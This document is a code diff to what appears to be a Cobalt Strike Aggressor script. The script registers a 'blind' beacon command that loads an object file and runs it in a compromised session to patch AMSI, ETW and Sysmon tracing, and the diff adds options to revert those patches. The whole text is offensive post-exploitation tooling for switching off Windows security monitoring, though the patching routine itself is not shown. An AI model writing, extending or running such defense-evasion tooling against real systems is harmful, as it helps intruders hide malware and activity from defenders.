@@ -1,12 +1,16 @@
 beacon_command_register(
     "blind",
-    "Patch, revert, or check AMSI, ETW, and NtTraceEvent (Sysmon)",
+    "Patch, revert, or check AMSI, ETW, and Sysmon",
     "Usage:\n" .
-    "\tblind patch       - Patch AMSI, ETW, and Sysmon (All)\n" .
-    "\tblind amsi        - Patch AMSI only\n" .
-    "\tblind etw         - Patch ETW only\n" .
-    "\tblind sysmon      - Patch NtTraceEvent only\n" .
-    "\tblind check       - Check AMSI, ETW, and NtTraceEvent status\n"
+    "\tblind patch         - Patch AMSI, ETW, and Sysmon (all)\n" .
+    "\tblind amsi          - Patch AMSI only\n" .
+    "\tblind etw           - Patch ETW only\n" .
+    "\tblind sysmon        - Patch Sysmon only\n" .
+    "\tblind check         - Check status of all hooks\n" .
+    "\tblind revert        - Revert all patches\n" .
+    "\tblind revert-amsi   - Revert AMSI patch\n" .
+    "\tblind revert-etw    - Revert ETW patch\n" .
+    "\tblind revert-sysmon - Revert Sysmon patch\n"
 );
 
 alias blind {
@@ -28,6 +32,14 @@ alias blind {
         $mode = 3;
     } else if ($2 eq "check") {
         $mode = 4;
+    } else if ($2 eq "revert") {
+        $mode = 5;
+    } else if ($2 eq "revert-amsi") {
+        $mode = 6;
+    } else if ($2 eq "revert-etw") {
+        $mode = 7;
+    } else if ($2 eq "revert-sysmon") {
+        $mode = 8;
     } else {
         berror($1, "Unknown command: $2");
         berror($1, beacon_command_detail("blind"));
@@ -36,7 +48,6 @@ alias blind {
 
     $args = bof_pack($1, "i", $mode);
 
-    # Load .o from absolute path
     $handle = openf("dist/bofblind.x64.o");
     if ($handle == -1) {
         berror($1, "Failed to open BOF object: dist/bofblind.x64.o");
@@ -46,6 +57,6 @@ alias blind {
     $data = readb($handle, -1);
     closef($handle);
 
-    btask($1, "Blinder: blind $2");
+    btask($1, "blind $2");
     beacon_inline_execute($1, $data, "go", $args);
 }
